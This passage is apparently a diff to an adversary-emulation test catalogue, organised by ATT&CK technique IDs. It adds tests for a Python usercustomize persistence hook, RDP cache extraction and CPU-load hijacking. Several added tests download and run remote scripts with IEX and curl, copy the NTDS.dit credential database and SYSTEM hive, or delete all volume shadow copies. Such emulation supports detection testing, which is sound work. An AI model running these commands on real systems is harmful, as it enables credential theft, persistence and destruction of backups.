+          package manager (e.g., Debian Based ''sudo apt-get update && sudo apt-get
+          install -y python3 python3-venv'', RedHat / CentOS Based ''sudo yum install
+          -y python3 python3-venv || sudo dnf install -y python3 python3-venv'', MacOS
+          brew install python3 or brew install python@3.x or the macOS developer tools
+          (''xcode-select --install''))."
+
+          '
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          PYTHON_EXE=$(command -v #{python_exe} || command -v python)
+          USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
+          mkdir -p "$USER_PACKAGES"
+          echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
+          if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
+          $PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
+          if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
+        cleanup_command: |
+          PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+          USER_PACKAGES=$($PYTHON_CMD -S -c "import site; print(site.getusersitepackages())")
+          if [ ! -f /tmp/poc.txt ] || [ ! -f $USER_PACKAGES/usercustomize.py ]; then echo "[!] Artifact missing: /tmp/poc.txt and $USER_PACKAGES/usercustomize.py — [-] Please Run : Invoke-AtomicTest T1546.018"; exit 0; fi
+          if [ -e "$USER_PACKAGES"/usercustomize* ]; then echo "[+] Successful remove $USER_PACKAGES/usercustomize.py\n" $(rm -rf "$USER_PACKAGES"/usercustomize*); else echo "usercustomize.py not found under $USER_PACKAGES"; fi
+          rm -rf /tmp/poc.txt
+          echo "[+] Successful remove poc.txt under /tmp"
   T1037.003:
     technique:
       type: attack-pattern
@@ -81829,7 +82392,6 @@ collection:
       auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
       description: |
         Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
-
         [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
       supported_platforms:
       - windows
@@ -81871,6 +82433,45 @@ collection:
           '
         name: powershell
         elevation_required: true
+    - name: RDP Bitmap Cache Extraction via bmc-tools
+      auto_generated_guid: 98f19852-7348-4f99-9e15-6ff4320464c7
+      description: |
+        Simulates an attacker extracting the RDP bitmap cache using the ANSSI "bmc-tools.py" script.
+        This test requires valid RDP bitmap cache files to exist on the system (usually created after an outgoing RDP connection is made).
+      supported_platforms:
+      - windows
+      input_arguments:
+        cache_path:
+          description: Path to the RDP Cache directory or specific .bmc file
+          type: path
+          default: "$env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache"
+        output_dir:
+          description: Directory to save reconstructed images
+          type: path
+          default: "$env:TEMP\\rdp_screens"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Python must be installed and in the PATH to run bmc-tools.py
+
+          '
+        prereq_command: 'if (Get-Command python -ErrorAction SilentlyContinue) { exit
+          0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Write-Host "Please install Python manually."
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'\n$toolsDir
+          = \"$env:TEMP\\bmc-tools.py\"\n \n# create output directory\nNew-Item -ItemType
+          Directory -Path #{output_dir} -Force | Out-Null\n\n# python script download\n&
+          curl.exe -L $url --output $toolsDir\n \n# execution step\nif (Test-Path
+          $toolsDir) { python $toolsDir -s \"#{cache_path}\" -d #{output_dir} -b }\n"
+        cleanup_command: |
+          Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
+          Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue
   T1557:
     technique:
       type: attack-pattern
@@ -98393,6 +98994,62 @@ credential-access:
           diskshadow.exe /s #{filename}
         name: command_prompt
         elevation_required: true
+    - name: Copy NTDS in low level NTFS acquisition via MFT parsing
+      auto_generated_guid: f57cb283-c131-4e2f-8a6c-363d575748b2
+      description: |
+        This test is intended to be run on a domain Controller.
+
+        UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).
+      supported_platforms:
+      - windows
+      input_arguments:
+        extract_path:
+          type: string
+          default: C:\Windows\Temp
+          description: Path for extracted NTDS.dit
+        script_url:
+          description: URL to UnderlayCopy script
+          type: url
+          default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR #{script_url} -UseBasicParsing)
+          Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
+          Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
+        name: powershell
+        elevation_required: true
+        cleanup_command: |
+          remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
+          remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
+    - name: Copy NTDS in low level NTFS acquisition via fsutil
+      auto_generated_guid: c7be89f7-5d06-4321-9f90-8676a77e0502
+      description: |
+        This test is intended to be run on a domain Controller.
+
+        UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).
+      supported_platforms:
+      - windows
+      input_arguments:
+        extract_path:
+          type: string
+          default: C:\Windows\Temp
+          description: Path for extracted NTDS.dit
+        script_url:
+          description: URL to UnderlayCopy script
+          type: url
+          default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR #{script_url} -UseBasicParsing)
+          Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
+          Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
+        name: powershell
+        elevation_required: true
+        cleanup_command: |
+          remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
+          remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
   T1558.003:
     technique:
       type: attack-pattern
@@ -98829,8 +99486,7 @@ credential-access:
           '
         prereq_command: |
           $RequiredModule = Get-Module -Name DSInternals -ListAvailable
-          if (-not $RequiredModule) {exit 1}
-          if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+          if (-not $RequiredModule) {exit 1} else {exit 0}
         get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force
 
           '
@@ -117253,6 +117909,28 @@ impact:
 
           '
         name: sh
+    - name: Windows - Simulate CPU Load with PowerShell
+      auto_generated_guid: 44315fb0-f78d-4cef-b10f-cf21c1fe2c75
+      description: |
+        This test simulates high CPU load using PowerShell, commonly seen in resource hijacking.
+        Spawns background jobs to stress CPU cores for a specified duration.
+      supported_platforms:
+      - windows
+      input_arguments:
+        duration_seconds:
+          description: Duration in seconds to run the CPU stress test
+          type: integer
+          default: 30
+        cpu_threads:
+          description: Number of threads to stress (default 4)
+          type: integer
+          default: 4
+      executor:
+        command: |
+          $end = (Get-Date).AddSeconds(#{duration_seconds})
+          1..#{cpu_threads} | ForEach-Object { Start-Job { param($t) while((Get-Date) -lt $t) { $i=0; while($i -lt 200000){$i++} } } -ArgumentList $end }
+          Get-Job | Wait-Job | Remove-Job
+        name: powershell
   T1565.002:
     technique:
       type: attack-pattern
@@ -118012,6 +118690,35 @@ impact:
         command: sudo tmutil disable
         cleanup_command: sudo tmutil enable
         name: sh
+        elevation_required: true
+    - name: Windows - Delete Volume Shadow Copies via Diskshadow
+      auto_generated_guid: 42111a6f-7e7f-482c-9b1b-3cfd090b999c
+      description: 'Deletes Windows Volume Shadow Copies via Diskshadow binary. This
+        technique is used by numerous ransomware families such as Crytox. The binary
+        is present by default in Windows Server operating systems (since Windows Server
+        2008). Upon execution, it will delete all shadow copies of the server.
+
+        '
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Create volume shadow copy of C:\ . This prereq command only
+          works on Windows Server or Windows 8.
+
+          '
+        prereq_command: 'if(!(vssadmin.exe list shadows | findstr "No items found
+          that satisfy the query.")) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'vssadmin.exe create shadow /for=c:
+
+          '
+      executor:
+        command: '"delete shadows all" | diskshadow.exe
+
+          '
+        name: powershell
         elevation_required: true
   T1561.001:
     technique:
